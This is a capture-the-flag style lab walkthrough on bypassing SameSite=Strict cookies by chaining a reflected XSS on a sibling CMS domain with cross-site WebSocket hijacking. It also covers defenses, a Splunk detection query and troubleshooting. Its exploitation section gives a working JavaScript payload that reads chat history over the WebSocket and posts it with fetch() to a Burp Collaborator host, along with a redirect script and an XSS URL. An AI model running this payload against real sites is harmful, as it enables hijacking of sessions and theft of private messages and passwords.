
# Lab Walkthrough: SameSite Strict bypass via sibling domain

* **Vulnerability Type:** Cross-Site WebSocket Hijacking (CSWSH) / SameSite Cookie Bypass via XSS
* **Target Context:** Multi-stage attack (Sibling Domain XSS -> WebSocket Hijacking -> Data Exfiltration)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 25–35 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, payloads, and technical documentation contained in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Execution Insight: "Site" vs. "Origin"](#4-execution-insight-site-vs-origin)
5. [Defense, Hardening & Secure Coding](#5-defense-hardening--secure-coding)
6. [SIEM Detection & Telemetry Analysis](#6-siem-detection--telemetry-analysis)
7. [Troubleshooting & Diagnostic Runbook](#7-troubleshooting--diagnostic-runbook)

---

## 1. Vulnerability Architecture & Mechanism

This lab demonstrates how isolating applications via subdomains provides zero protection against token-based attacks if the primary application relies exclusively on `SameSite` cookie attributes for defense.

* **The Core Flaw:** The target's live chat uses WebSockets but fails to implement unpredictable anti-CSWSH tokens during the handshake. It relies entirely on the `SameSite=Strict` attribute of the session cookie to prevent cross-site hijacking. However, the organization hosts a secondary, poorly secured application on a sibling domain (`cms-YOUR-LAB-ID`) that contains a Reflected XSS vulnerability.
* **The Mechanism:** The `SameSite` attribute evaluates trust based on the "Site" (eTLD+1, like `example.com`), not the strict "Origin" (`app.example.com` vs. `cms.example.com`). If an attacker can execute arbitrary JavaScript on *any* sibling domain via XSS, the browser considers network requests made by that script to be "same-site." The attacker forces the victim to execute an XSS payload on the sibling domain, which in turn opens a WebSocket connection to the main domain. Because it originates from the same site, the browser attaches the `SameSite=Strict` cookie, authenticating the malicious WebSocket connection.
* **Real-World Analogy:** A corporate office (the main domain) issues high-security keycards (`SameSite=Strict`) that only unlock doors if the scan originates from *inside* the corporate campus. You cannot scan them from the public street (an external exploit server). However, the corporation also owns a poorly secured cafeteria building next door on the same campus (the sibling domain). A thief breaks into the cafeteria, routes a signal cable from the cafeteria to the main office door, and because the signal technically originates "on-campus," the main door unlocks.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   SAMESITE STRICT BYPASS EXECUTION FLOW                │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Delivery]
  Exploit Server redirects Victim to: 
  [https://cms-target.com/login?username=](https://cms-target.com/login?username=)<script>CSWSH_PAYLOAD</script>

  [2. Sibling Domain Execution (XSS)]
  Victim's browser renders `cms-target.com` and executes the XSS payload.
  The script initiates a WebSocket handshake to `wss://[main-target.com/chat](https://main-target.com/chat)`.
           
  [3. The SameSite Bypass]
  Browser checks `SameSite=Strict` rules.
  Is `cms-target.com` the same site as `main-target.com`? -> YES (Shared eTLD+1).
  Browser attaches the victim's session cookie to the WebSocket handshake.

  [4. Exfiltration]
  WebSocket connects. Payload sends "READY". Server returns chat history.
  Payload forwards the chat history (containing passwords) to the attacker.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The live chat WebSocket endpoint (`wss://.../chat`) and the sibling domain's login page (`https://cms-.../login`).
* **Primary Objective:** Exploit the sibling domain XSS to execute a Cross-Site WebSocket Hijacking (CSWSH) attack, bypassing the `SameSite=Strict` restriction to steal the victim's chat history (and credentials).
* **Validation Signal:** The lab is solved when you extract the victim's plaintext credentials from the exfiltrated chat history and successfully log into their account.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Vulnerability Mapping

* **Analyze the Chat:** Intercept the live chat functionality. Notice the `GET /chat` WebSocket handshake contains no CSRF tokens, relying entirely on the `session` cookie. Sending a `READY` message through the socket causes the server to dump the entire chat history.
* **Analyze the Defenses:** The application explicitly sets `SameSite=Strict` on the session cookie. A standard exploit hosted on an external server will fail because the browser strips the cookie.
* **Discover the Sibling Domain:** Reconnaissance reveals a secondary system (e.g., a CMS login page at `https://cms-YOUR-LAB-ID...`).
* **Discover the XSS:** Submitting a payload in the username field (e.g., `<script>alert(1)</script>`) reflects directly into the DOM, confirming a Reflected XSS vulnerability on the sibling domain.

### Phase 2: Payload Construction (The CSWSH Script)

Write the JavaScript payload that will hijack the WebSocket and exfiltrate the data.

```javascript
// This script will be executed via XSS on the sibling domain
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
ws.onopen = function() {
    ws.send("READY"); // Triggers the server to send the chat history
};
ws.onmessage = function(event) {
    // Exfiltrate the received chat history to Burp Collaborator
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};

```

### Phase 3: Weaponization & Delivery

1. URL-encode the entire CSWSH JavaScript payload.
2. Construct the final XSS URL targeting the sibling domain:
`https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=<script>URL_ENCODED_PAYLOAD</script>&password=test`
3. Host the delivery mechanism on the Exploit Server to force the victim's browser to navigate to the weaponized URL:
```html
<script>
    document.location = "[https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=...&password=test](https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=...&password=test)";
</script>

```


4. **Execution:** Click "Deliver exploit to victim". The victim navigates to the sibling domain, the XSS executes, the `SameSite` check passes, the WebSocket opens, and the chat history is exfiltrated to your Burp Collaborator instance.
5. Review the Collaborator logs to find the victim's leaked password and log in.

---

## 4. Execution Insight: "Site" vs. "Origin"

A critical concept in web security is understanding how browsers define boundaries for different security mechanisms.

* **Same-Origin Policy (SOP):** Extremely strict. Requires an exact match of Scheme, Host, and Port. `https://cms.target.com` and `https://app.target.com` are *different origins*.
* **SameSite Cookie Attribute:** Relaxed. Requires only a match of the Scheme and the eTLD+1 (Effective Top-Level Domain plus one). `https://cms.target.com` and `https://app.target.com` are the *same site*.

WebSockets intentionally bypass the SOP to allow for cross-origin communication, relying on the server to explicitly validate the `Origin` HTTP header during the handshake. In this lab, the server failed to validate the `Origin` header and failed to use cryptographic tokens, offloading 100% of its security to the `SameSite` cookie. Because the attacker executed code on a sibling domain, they perfectly threaded the needle: bypassing the cookie restriction (because it's the same site) while leveraging WebSockets' lack of SOP enforcement.

---

## 5. Defense, Hardening & Secure Coding

Relying exclusively on `SameSite` attributes is an anti-pattern when an organization manages multiple subdomains with varying security postures.

* **Implement CSWSH Tokens (Primary Defense):** WebSocket handshakes must be protected using the exact same Synchronizer Token Pattern used for standard CSRF. A unique, unguessable token must be generated upon page load and passed in the WebSocket handshake (either as a URL parameter like `wss://.../chat?token=XYZ` or via the first message sent over the socket).
* **Strict Origin Validation:** The backend server handling the WebSocket upgrade request must strictly validate the `Origin` header. If the handshake request originates from an untrusted origin (or even a sibling domain that shouldn't be accessing the chat API), the server should return a `403 Forbidden` and refuse to upgrade the connection to a WebSocket.
* **Fix the XSS:** The root enabler of the bypass is the XSS vulnerability on the sibling domain. Context-aware output encoding must be applied universally across all domains and subdomains owned by the organization.

---

## 6. SIEM Detection & Telemetry Analysis

Detecting this attack chain requires correlating cross-subdomain activity and anomalous WebSocket connections.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| transaction src_ip maxspan=10s
| search (uri_path="/login" uri_query="*<script>*") AND (uri_path="/chat" upgrade="websocket")
| stats count by src_ip, user_agent, referer

```

*Indicator of Attack (IoA):* A highly suspicious sequence where a user attempts a login request on a CMS domain containing known XSS signatures (script tags, fetch APIs), immediately followed by that same user establishing a WebSocket connection to the main application's chat endpoint. The `Referer` or `Origin` header on the WebSocket upgrade request pointing to the CMS domain (`cms-...`) rather than the main application is a definitive red flag.

---

## 7. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **No Collaborator Interactions** | Payload Syntax Error. | Ensure the XSS payload is strictly URL-encoded. Bare characters like `&`, `<`, or `+` in a query parameter will break the HTTP request before the application even processes the username parameter. |
| **Only one interaction (No chat history)** | Premature Exfiltration. | The `ws.send("READY")` must be executed *inside* the `ws.onopen` callback. If you call it synchronously before the socket finishes its handshake, the message is lost, and the server never sends the history. |
| **Console Error: `WebSocket connection to '...' failed**` | Scheme Mismatch. | Ensure you are using `wss://` (WebSocket Secure) instead of `ws://`. Browsers will strictly block unencrypted WebSocket connections originating from HTTPS pages (Mixed Content). |

---

> **Key Insight:** Security architectures that rely on isolated subdomains are only as strong as their weakest link. If you delegate authentication protections to eTLD+1 boundary mechanisms like `SameSite`, a vulnerability in your forgotten, legacy CMS subdomain grants an attacker a trusted bridge straight into your flagship application.

```

```
